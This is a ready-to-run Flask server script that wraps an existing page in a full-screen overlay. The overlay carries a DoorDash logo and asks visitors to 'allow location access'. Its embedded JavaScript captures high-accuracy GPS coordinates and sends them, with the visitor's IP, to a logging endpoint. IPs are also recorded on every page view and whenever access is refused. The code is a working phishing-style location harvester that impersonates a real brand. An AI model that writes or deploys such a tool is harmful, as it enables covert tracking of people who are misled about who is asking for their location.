from flask import Flask, request, jsonify
import logging
from datetime import datetime
import os
import json

app = Flask(__name__)

# Enhanced logging configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('gps_logger')

# HTML template with inline injection
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Location Service</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        .gps-overlay {{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }}
        .gps-modal {{
            background: white;
            padding: 25px;
            border-radius: 10px;
            max-width: 400px;
            text-align: center;
        }}
        .gps-btn {{
            background: #FF3008;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 15px;
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <!-- Your existing content will appear here -->
    {existing_content}
    
    <!-- GPS Permission Overlay -->
    <div class="gps-overlay">
        <div class="gps-modal">
            <img src="https://cdn.doordash.com/managed/consumer/seo/doordash_seo_desktop.png" width="120" alt="Logo">
            <h2>We need your location to serve you better</h2>
            <p>Please allow location access to find nearby services.</p>
            <button class="gps-btn" id="gps-allow-btn">Allow Location Access</button>
        </div>
    </div>

    <script>
        document.getElementById('gps-allow-btn').addEventListener('click', async () => {{
            try {{
                // Log the permission request
                await fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        type: 'permission_request',
                        ip: await fetch('/getip').then(r => r.text()),
                        timestamp: new Date().toISOString()
                    }})
                }});
                
                // Request actual location
                const position = await new Promise((resolve, reject) => {{
                    navigator.geolocation.getCurrentPosition(resolve, reject, {{
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }});
                }});
                
                // Log successful location
                await fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        type: 'location_data',
                        ip: await fetch('/getip').then(r => r.text()),
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString()
                    }})
                }});
                
                // Remove overlay
                document.querySelector('.gps-overlay').remove();
            }} catch (error) {{
                console.error('Location error:', error);
                await fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        type: 'error',
                        error: error.message,
                        ip: await fetch('/getip').then(r => r.text()),
                        timestamp: new Date().toISOString()
                    }})
                }});
                alert('Location access is required to continue.');
            }}
        }});
    </script>
</body>
</html>
"""

@app.route('/')
def serve_page():
    """Serve the page with GPS overlay"""
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    logger.info(f"Page served to IP: {client_ip}")
    
    # Load your existing page.html content
    with open('page.html', 'r') as f:
        existing_content = f.read()
    
    return HTML_TEMPLATE.format(existing_content=existing_content)

@app.route('/getip')
def get_ip():
    """Endpoint to get client IP"""
    return request.headers.get('X-Forwarded-For', request.remote_addr)

@app.route('/log', methods=['POST'])
def log_data():
    """Central logging endpoint"""
    data = request.json
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Enhanced logging with all relevant data
    log_entry = {
        'timestamp': datetime.utcnow().isoformat(),
        'client_ip': client_ip,
        'event_data': data
    }
    
    logger.info(json.dumps(log_entry, indent=2))
    return jsonify({'status': 'success'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
